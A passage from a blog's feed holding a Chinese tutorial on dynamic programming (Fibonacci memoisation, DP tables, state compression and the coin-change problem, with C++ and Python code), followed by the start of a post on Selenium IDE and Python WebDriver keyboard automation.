class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 备忘录全初始化为 0</span></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">memo</span><span class="params">(N + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="comment">// 进行带备忘录的递归</span></span><br><span class="line">    <span class="keyword">return</span> helper(memo, N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">helper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; memo, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span> || n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 已经计算过</span></span><br><span class="line">    <span class="keyword">if</span> (memo[n] != <span class="number">0</span>) <span class="keyword">return</span> memo[n];</span><br><span class="line">    memo[n] = helper(memo, n - <span class="number">1</span>) + helper(memo, n - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> memo[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，画出递归树，你就知道「备忘录」到底做了什么。</p><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/2.jpg" alt="img"></p><p>实际上，带「备忘录」的递归算法，把一棵存在巨量冗余的递归树通过「剪枝」，改造成了一幅不存在冗余的递归图，极大减少了子问题（即递归图中节点）的个数。</p><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/3.jpg" alt="img"></p><p><strong>递归算法的时间复杂度怎么计算？就是用子问题个数乘以解决一个子问题需要的时间。</strong></p><p>子问题个数，即图中节点的总数，由于本算法不存在冗余计算，子问题就是 <code>f(1)</code>, <code>f(2)</code>, <code>f(3)</code> … <code>f(20)</code>，数量和输入规模 n = 20 成正比，所以子问题个数为 O(n)。</p><p>解决一个子问题的时间，同上，没有什么循环，时间为 O(1)。</p><p>所以，本算法的时间复杂度是 O(n)。比起暴力算法，是降维打击。</p><p>至此，带备忘录的递归解法的效率已经和迭代的动态规划解法一样了。实际上，这种解法和迭代的动态规划已经差不多了，只不过这种方法叫做「自顶向下」，动态规划叫做「自底向上」。</p><p>啥叫「自顶向下」？注意我们刚才画的递归树（或者说图），是从上向下延伸，都是从一个规模较大的原问题比如说 <code>f(20)</code>，向下逐渐分解规模，直到 <code>f(1)</code> 和 <code>f(2)</code> 这两个 base case，然后逐层返回答案，这就叫「自顶向下」。</p><p>啥叫「自底向上」？反过来，我们直接从最底下，最简单，问题规模最小的 <code>f(1)</code> 和 <code>f(2)</code> 开始往上推，直到推到我们想要的答案 <code>f(20)</code>，这就是动态规划的思路，这也是为什么动态规划一般都脱离了递归，而是由循环迭代完成计算。</p><p><strong>3、dp 数组的迭代解法</strong></p><p>有了上一步「备忘录」的启发，我们可以把这个「备忘录」独立出来成为一张表，就叫做 DP table 吧，在这张表上完成「自底向上」的推算岂不美哉！</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (N == <span class="number">1</span> || N == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(N + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    dp[<span class="number">1</span>] = dp[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= N; i++)</span><br><span class="line">        dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">return</span> dp[N];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/4.jpg" alt="img"></p><p>画个图就很好理解了，而且你发现这个 DP table 特别像之前那个「剪枝」后的结果，只是反过来算而已。实际上，带备忘录的递归解法中的「备忘录」，最终完成后就是这个 DP table，所以说这两种解法其实是差不多的，大部分情况下，效率也基本相同。</p><p>这里，引出「状态转移方程」这个名词，实际上就是描述问题结构的数学形式：</p><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/fib.png" alt="img"></p><p>为啥叫「状态转移方程」？其实就是为了听起来高端。你把 <code>f(n)</code> 想做一个状态 <code>n</code>，这个状态 <code>n</code> 是由状态 <code>n - 1</code> 和状态 <code>n - 2</code> 相加转移而来，这就叫状态转移，仅此而已。</p><p>你会发现，上面的几种解法中的所有操作，例如 <code>return f(n - 1) + f(n - 2)</code>，<code>dp[i] = dp[i - 1] + dp[i - 2]</code>，以及对备忘录或 DP table 的初始化操作，都是围绕这个方程式的不同表现形式。可见列出「状态转移方程」的重要性，它是解决问题的核心。而且很容易发现，其实状态转移方程直接代表着暴力解法。</p><p><strong>千万不要看不起暴力解，动态规划问题最困难的就是写出这个暴力解，即状态转移方程</strong>。只要写出暴力解，优化方法无非是用备忘录或者 DP table，再无奥妙可言。</p><p>这个例子的最后，讲一个细节优化。细心的读者会发现，根据斐波那契数列的状态转移方程，当前状态只和之前的两个状态有关，其实并不需要那么长的一个 DP table 来存储所有的状态，只要想办法存储之前的两个状态就行了。所以，可以进一步优化，把空间复杂度降为 O(1)：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">2</span> || n == <span class="number">1</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> prev = <span class="number">1</span>, curr = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> sum = prev + curr;</span><br><span class="line">        prev = curr;</span><br><span class="line">        curr = sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> curr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个技巧就是所谓的「<strong>状态压缩</strong>」，如果我们发现每次状态转移只需要 DP table 中的一部分，那么可以尝试用状态压缩来缩小 DP table 的大小，只记录必要的数据，上述例子就相当于把DP table 的大小从 <code>n</code> 缩小到 2。后续的动态规划章节中我们还会看到这样的例子，一般来说是把一个二维的 DP table 压缩成一维，即把空间复杂度从 O(n^2) 压缩到 O(n)。</p><p>有人会问，动态规划的另一个重要特性「最优子结构」，怎么没有涉及？下面会涉及。斐波那契数列的例子严格来说不算动态规划，因为没有涉及求最值，以上旨在说明重叠子问题的消除方法，演示得到最优解法逐步求精的过程。下面，看第二个例子，凑零钱问题。</p><h3 id="二、凑零钱问题"><a href="#二、凑零钱问题" class="headerlink" title="二、凑零钱问题"></a>二、凑零钱问题</h3><p>先看下题目：给你 <code>k</code> 种面值的硬币，面值分别为 <code>c1, c2 ... ck</code>，每种硬币的数量无限，再给一个总金额 <code>amount</code>，问你<strong>最少</strong>需要几枚硬币凑出这个金额，如果不可能凑出，算法返回 -1 。算法的函数签名如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// coins 中是可选硬币面值，amount 是目标金额</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(<span class="keyword">int</span>[] coins, <span class="keyword">int</span> amount)</span></span>;</span><br></pre></td></tr></table></figure><p>比如说 <code>k = 3</code>，面值分别为 1，2，5，总金额 <code>amount = 11</code>。那么最少需要 3 枚硬币凑出，即 11 = 5 + 5 + 1。</p><p>你认为计算机应该如何解决这个问题？显然，就是把所有可能的凑硬币方法都穷举出来，然后找找看最少需要多少枚硬币。</p><p><strong>1、暴力递归</strong></p><p>首先，这个问题是动态规划问题，因为它具有「最优子结构」的。<strong>要符合「最优子结构」，子问题间必须互相独立</strong>。啥叫相互独立？你肯定不想看数学证明，我用一个直观的例子来讲解。</p><p>比如说，假设你考试，每门科目的成绩都是互相独立的。你的原问题是考出最高的总成绩，那么你的子问题就是要把语文考到最高，数学考到最高…… 为了每门课考到最高，你要把每门课相应的选择题分数拿到最高，填空题分数拿到最高…… 当然，最终就是你每门课都是满分，这就是最高的总成绩。</p><p>得到了正确的结果：最高的总成绩就是总分。因为这个过程符合最优子结构，“每门科目考到最高”这些子问题是互相独立，互不干扰的。</p><p>但是，如果加一个条件：你的语文成绩和数学成绩会互相制约，数学分数高，语文分数就会降低，反之亦然。这样的话，显然你能考到的最高总成绩就达不到总分了，按刚才那个思路就会得到错误的结果。因为子问题并不独立，语文数学成绩无法同时最优，所以最优子结构被破坏。</p><p>回到凑零钱问题，为什么说它符合最优子结构呢？比如你想求 <code>amount = 11</code> 时的最少硬币数（原问题），如果你知道凑出 <code>amount = 10</code> 的最少硬币数（子问题），你只需要把子问题的答案加一（再选一枚面值为 1 的硬币）就是原问题的答案。因为硬币的数量是没有限制的，所以子问题之间没有相互制，是互相独立的。</p><p>PS：关于最优子结构的问题，后文<a href="https://labuladong.gitee.io/algo/动态规划系列/最优子结构.html" target="_blank" rel="noopener">动态规划答疑篇</a> 还会再举例探讨。</p><p>那么，既然知道了这是个动态规划问题，就要思考<strong>如何列出正确的状态转移方程</strong>？</p><p>1、<strong>确定 base case</strong>，这个很简单，显然目标金额 <code>amount</code> 为 0 时算法返回 0，因为不需要任何硬币就已经凑出目标金额了。</p><p>2、<strong>确定「状态」，也就是原问题和子问题中会变化的变量</strong>。由于硬币数量无限，硬币的面额也是题目给定的，只有目标金额会不断地向 base case 靠近，所以唯一的「状态」就是目标金额 <code>amount</code>。</p><p>3、<strong>确定「选择」，也就是导致「状态」产生变化的行为</strong>。目标金额为什么变化呢，因为你在选择硬币，你每选择一枚硬币，就相当于减少了目标金额。所以说所有硬币的面值，就是你的「选择」。</p><p>4、<strong>明确 <code>dp</code> 函数/数组的定义</strong>。我们这里讲的是自顶向下的解法，所以会有一个递归的 <code>dp</code> 函数，一般来说函数的参数就是状态转移中会变化的量，也就是上面说到的「状态」；函数的返回值就是题目要求我们计算的量。就本题来说，状态只有一个，即「目标金额」，题目要求我们计算凑出目标金额所需的最少硬币数量。所以我们可以这样定义 <code>dp</code> 函数：</p><p><code>dp(n)</code> 的定义：输入一个目标金额 <code>n</code>，返回凑出目标金额 <code>n</code> 的最少硬币数量。</p><p>搞清楚上面这几个关键点，解法的伪码就可以写出来了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 伪码框架</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(coins: List[int], amount: int)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义：要凑出金额 n，至少要 dp(n) 个硬币</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dp</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="comment"># 做选择，选择需要硬币最少的那个结果</span></span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            res = min(res, <span class="number">1</span> + dp(n - coin))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 题目要求的最终结果是 dp(amount)</span></span><br><span class="line">    <span class="keyword">return</span> dp(amount)</span><br></pre></td></tr></table></figure><p>根据伪码，我们加上 base case 即可得到最终的答案。显然目标金额为 0 时，所需硬币数量为 0；当目标金额小于 0 时，无解，返回 -1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(coins: List[int], amount: int)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dp</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="comment"># base case</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        <span class="comment"># 求最小值，所以初始化为正无穷</span></span><br><span class="line">        res = float(<span class="string">'INF'</span>)</span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            subproblem = dp(n - coin)</span><br><span class="line">            <span class="comment"># 子问题无解，跳过</span></span><br><span class="line">            <span class="keyword">if</span> subproblem == <span class="number">-1</span>: <span class="keyword">continue</span></span><br><span class="line">            res = min(res, <span class="number">1</span> + subproblem)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res <span class="keyword">if</span> res != float(<span class="string">'INF'</span>) <span class="keyword">else</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp(amount)</span><br></pre></td></tr></table></figure><p>至此，状态转移方程其实已经完成了，以上算法已经是暴力解法了，以上代码的数学形式就是状态转移方程：</p><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/coin.png" alt="img"></p><p>至此，这个问题其实就解决了，只不过需要消除一下重叠子问题，比如 <code>amount = 11, coins = {1,2,5}</code> 时画出递归树看看：</p><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/5.jpg" alt="img"></p><p><strong>递归算法的时间复杂度分析：子问题总数 x 每个子问题的时间</strong>。</p><p>子问题总数为递归树节点个数，这个比较难看出来，是 O(n^k)，总之是指数级别的。每个子问题中含有一个 for 循环，复杂度为 O(k)。所以总时间复杂度为 O(k * n^k)，指数级别。</p><p><strong>2、带备忘录的递归</strong></p><p>类似之前斐波那契数列的例子，只需要稍加修改，就可以通过备忘录消除子问题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">coinChange</span><span class="params">(coins: List[int], amount: int)</span>:</span></span><br><span class="line">    <span class="comment"># 备忘录</span></span><br><span class="line">    memo = dict()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dp</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="comment"># 查备忘录，避免重复计算</span></span><br><span class="line">        <span class="keyword">if</span> n <span class="keyword">in</span> memo: <span class="keyword">return</span> memo[n]</span><br><span class="line">        <span class="comment"># base case</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">0</span>: <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        res = float(<span class="string">'INF'</span>)</span><br><span class="line">        <span class="keyword">for</span> coin <span class="keyword">in</span> coins:</span><br><span class="line">            subproblem = dp(n - coin)</span><br><span class="line">            <span class="keyword">if</span> subproblem == <span class="number">-1</span>: <span class="keyword">continue</span></span><br><span class="line">            res = min(res, <span class="number">1</span> + subproblem)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记入备忘录</span></span><br><span class="line">        memo[n] = res <span class="keyword">if</span> res != float(<span class="string">'INF'</span>) <span class="keyword">else</span> <span class="number">-1</span></span><br><span class="line">        <span class="keyword">return</span> memo[n]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp(amount)</span><br></pre></td></tr></table></figure><p>不画图了，很显然「备忘录」大大减小了子问题数目，完全消除了子问题的冗余，所以子问题总数不会超过金额数 <code>n</code>，即子问题数目为 O(n)。处理一个子问题的时间不变，仍是 O(k)，所以总的时间复杂度是 O(kn)。</p><p><strong>3、dp 数组的迭代解法</strong></p><p>当然，我们也可以自底向上使用 dp table 来消除重叠子问题，关于「状态」「选择」和 base case 与之前没有区别，<code>dp</code> 数组的定义和刚才 <code>dp</code> 函数类似，也是把「状态」，也就是目标金额作为变量。不过 <code>dp</code> 函数体现在函数参数，而 <code>dp</code> 数组体现在数组索引：</p><p><strong><code>dp</code> 数组的定义：当目标金额为 <code>i</code> 时，至少需要 <code>dp[i]</code> 枚硬币凑出</strong>。</p><p>根据我们文章开头给出的动态规划代码框架可以写出如下解法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">coinChange</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; coins, <span class="keyword">int</span> amount)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 数组大小为 amount + 1，初始值也为 amount + 1</span></span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">dp</span><span class="params">(amount + <span class="number">1</span>, amount + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 外层 for 循环在遍历所有状态的所有取值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dp.size(); i++) &#123;</span><br><span class="line">        <span class="comment">// 内层 for 循环在求所有选择的最小值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> coin : coins) &#123;</span><br><span class="line">            <span class="comment">// 子问题无解，跳过</span></span><br><span class="line">            <span class="keyword">if</span> (i - coin &lt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            dp[i] = min(dp[i], <span class="number">1</span> + dp[i - coin]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (dp[amount] == amount + <span class="number">1</span>) ? <span class="number">-1</span> : dp[amount];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://labuladong.gitee.io/algo/pictures/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E8%AF%A6%E8%A7%A3%E8%BF%9B%E9%98%B6/6.jpg" alt="img"></p><p>PS：为啥 <code>dp</code> 数组初始化为 <code>amount + 1</code> 呢，因为凑成 <code>amount</code> 金额的硬币数最多只可能等于 <code>amount</code>（全用 1 元面值的硬币），所以初始化为 <code>amount + 1</code> 就相当于初始化为正无穷，便于后续取最小值。</p><h3 id="三、最后总结"><a href="#三、最后总结" class="headerlink" title="三、最后总结"></a>三、最后总结</h3><p>第一个斐波那契数列的问题，解释了如何通过「备忘录」或者「dp table」的方法来优化递归树，并且明确了这两种方法本质上是一样的，只是自顶向下和自底向上的不同而已。</p><p>第二个凑零钱的问题，展示了如何流程化确定「状态转移方程」，只要通过状态转移方程写出暴力递归解，剩下的也就是优化递归树，消除重叠子问题而已。</p><p>如果你不太了解动态规划，还能看到这里，真得给你鼓掌，相信你已经掌握了这个算法的设计技巧。</p><p><strong>计算机解决问题其实没有任何奇技淫巧，它唯一的解决办法就是穷举</strong>，穷举所有可能性。算法设计无非就是先思考“如何穷举”，然后再追求“如何聪明地穷举”。</p><p>列出动态转移方程，就是在解决“如何穷举”的问题。之所以说它难，一是因为很多穷举需要递归实现，二是因为有的问题本身的解空间复杂，不那么容易穷举完整。</p><p>备忘录、DP table 就是在追求“如何聪明地穷举”。用空间换时间的思路，是降低时间复杂度的不二法门，除此之外，试问，还能玩出啥花活？</p><p>之后我们会有一章专门讲解动态规划问题，如果有任何问题都可以随时回来重读本文，希望读者在阅读每个题目和解法时，多往「状态」和「选择」上靠，才能对这套框架产生自己的理解，运用自如。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;动态规划&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;首先，动态规划问题的一般形式就是求最值&lt;/strong&gt;。动态规划其实是运筹学的一种最优化方法，只不过在计算机问题上应用比较多，比如说让你求&lt;strong&gt;最长&lt;/strong&gt;递增子序列呀，&lt;strong&gt;最小&lt;/strong&gt;编辑
      
    
    </summary>
    
    
    
      <category term="algorithm" scheme="https://kayleh.top/tags/algorithm/"/>
    
  </entry>
  
  <entry>
    <title>automated test：selenium</title>
    <link href="https://kayleh.top/automated-test-selenium/"/>
    <id>https://kayleh.top/automated-test-selenium/</id>
    <published>2021-01-31T18:52:47.000Z</published>
    <updated>2021-03-13T18:22:25.744Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Selenium"><a href="#Selenium" class="headerlink" title="Selenium"></a>Selenium</h1><blockquote><p>浏览器插件Selenium IDE</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612201844386.png" alt="1612201844386"></p><blockquote><p>Selenium 3.0没有RC</p></blockquote><p>使用：</p><ul><li>Record a new test in a new project<ul><li>在新项目中录制一个新测试</li></ul></li><li>Open an existing project<ul><li>打开一个现有项目</li></ul></li><li>Create a new project<ul><li>创建一个新项目</li></ul></li><li>Close Selenium IDE<ul><li>关闭Selenium IDE</li></ul></li></ul><h4 id="脚本录制"><a href="#脚本录制" class="headerlink" title="脚本录制"></a>脚本录制</h4><p>在浏览器中手动操作，就可以selenium录制出来</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612203333723.png" alt="1612203333723"></p><h4 id="断言"><a href="#断言" class="headerlink" title="断言"></a>断言</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612203983826.png" alt="1612203983826"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612204051810.png" alt="1612204051810"></p><h4 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h4><p>Export</p><p>python pytest</p><h3 id="在python环境下使用selenium"><a href="#在python环境下使用selenium" class="headerlink" title="在python环境下使用selenium"></a>在python环境下使用selenium</h3><p>1</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612205559810.png" alt="1612205559810"></p><p>2</p><p>浏览器驱动webdriver</p><p><a href="http://chromedriver.storage.googleapis.com/index.html" target="_blank" rel="noopener">http://chromedriver.storage.googleapis.com/index.html</a></p><p>放到python目录下（python已添加进系统变量）</p><h1 id="webdriver-API"><a href="#webdriver-API" class="headerlink" title="webdriver API"></a>webdriver API</h1><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/自动化测试/1612545316429.png" alt="1612545316429"></p><h4 id="键盘事件"><a href="#键盘事件" class="headerlink" title="键盘事件"></a>键盘事件</h4><h5 id="key包提供按键方法"><a href="#key包提供按键方法" class="headerlink" title="key包提供按键方法"></a>key包提供按键方法</h5><p>使用必须先引用key包：from selenium.webdriver.common.keys import Keys</p><p>键盘事件，在现实操作中我们习惯性的按tab见切换到写一个输入或者元素，Key()类几乎提供所有按键的方法：</p><div class="table-container"><table><thead><tr><th>引用方法</th><th>对应键盘</th></tr></thead><tbody><tr><td>send_keys(Keys.BACK_SPACE)</td><td>删除键（BackSpace）</td></tr><tr><td>send_keys(Keys.SPACE)</td><td>空格键(Space)</td></tr><tr><td>send_keys(Keys.TAB)</td><td>制表键(Tab)</td></tr><tr><td>send_keys(Keys.ESCAPE)</td><td>回退键（Esc）</td></tr><tr><td>send_keys(Keys.ENTER)</td><td>回车键（Enter）</td></tr><tr><td>send_keys(Keys.CONTROL,’a’)</td><td>全选（Ctrl+A）</td></tr><tr><td>send_keys(Keys.CONTROL,’c’)</td><td>复制（Ctrl+C）</td></tr><tr><td>send_keys(Keys.CONTROL,’x’)</td><td>剪切（Ctrl+X）</td></tr><tr><td>send_keys(Keys.CONTROL,’v’)</td><td>粘贴（Ctrl+V）</td></tr><tr><td>send_keys(Keys.F1)</td><td>键盘 F1</td></tr><tr><td>send_keys(Keys.F12)</td><td>键盘 F12</td></tr></tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line">driver.get(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line"></span><br><span class="line">driver.find_element_by_id(<span class="string">"kw"</span>).send_keys(<span class="string">"seleniumm"</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">driver.find_element_by_id(<span class="string">"kw"</span>).send_keys(Keys.BACK_SPACE) </span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 和前面的拼接</span></span><br><span class="line">driver.find_element_by_id(<span class="string">"kw"</span>).send_keys(<span class="string">"seleniumm"</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctrl+a</span></span><br><span class="line">driver.find_element_by_id(<span class="string">"kw"</span>).send_keys(Keys.CONTROL,<span class="string">"a"</span>) </span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">driver.find_element_by_id(<span class="string">"kw"</span>).send_keys(Keys.CONTROL,<span class="string">"x"</span>) </span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">driver.find_element_by_id(<span class="string">"kw"</span>).send_keys(Keys.CONTROL,<span class="string">"v"</span>) </span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">driver.find_element_by_id(<span class="string">"su"</span>).click()</span><br><span class="line"></span><br><span class="line">driver.quit()</span><br></pre></td></tr></table></figure><h4 